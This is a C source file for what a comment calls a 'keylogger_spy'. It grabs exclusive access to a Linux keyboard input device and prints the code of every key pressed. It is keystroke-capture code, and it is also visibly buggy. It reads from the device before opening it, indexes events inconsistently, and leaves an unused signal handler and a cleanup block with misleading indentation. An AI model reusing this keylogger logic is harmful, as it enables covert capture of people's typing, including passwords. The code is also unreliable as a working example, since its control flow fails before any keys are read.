#include <sys/ioctl.h>
#include <stdio.h> 
#include <linux/input.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/time.h>
#include "defs.h"

static volatile sig_atomic_t stop = 0;

void interrupt_handler(int sig)
{
	stop = 1;
}

void handle_sigint(int sig) 
{ 
    printf("Caught signal %d\n", sig); 
} 

int main(int argc, char *argv[])
{
	char *device = "/dev/input/event4";
	char dev_name[256];
	int fd = -1, status, result, rd;
  	int size = sizeof(struct input_event);
	size_t rb;
	struct input_event events[64];
	rb = read(fd, events, size * 64);

	signal(SIGINT, handle_sigint);

	if(rb < (int) sizeof(struct input_event)){
		fprintf(stderr, "Error bytes reading\n");
		CLEAN(EXIT_FAILURE);
	}

	fd = open(device, O_RDONLY);

	if(fd < 0){
		fprintf(stderr, "Can't open the device, note that only superuser can open the device.\n");
		CLEAN(EXIT_FAILURE);
	}

	printf("Getting exclusive access: ");
	sleep(1); // let the enter from the ./keylogger_spy time to relese.
	result = ioctl(fd, EVIOCGRAB, 1);
	printf("%s\n", (result == 0) ? "SUCCESS" : "FAILURE");

	if(ioctl(fd, EVIOCGNAME(sizeof(dev_name)), dev_name) < 0){
		fprintf(stderr, "Can't figure the name of the device\n");
		CLEAN(EXIT_FAILURE);
	}

	while(1)
	{
		if ((rd = read(fd, events, size * 64)) < size) {
			break;
		}

		unsigned int type, code, value;
		type = events[1].type;
		code = events[1].code;
		value = events[0].value;

		if(events[1].value == 1 && type == 1){
			printf("Event: time %ld.%06ld, ", events[1].time.tv_sec, events[1].time.tv_usec);
			printf("TypeName: EV_KEY, Code: %d\n", code);
		}
	}
	ioctl(fd, EVIOCGRAB, (void*)0);
	CLEAN(EXIT_SUCCESS);

cleanup:
	if(fcntl(fd, F_GETFD) != -1 || errno != EBADF)
        ioctl(fd, EVIOCGRAB, 0);
		close(fd);

	if(events != NULL)
		memset(events, 0, sizeof(struct input_event)*64);

	return status;
}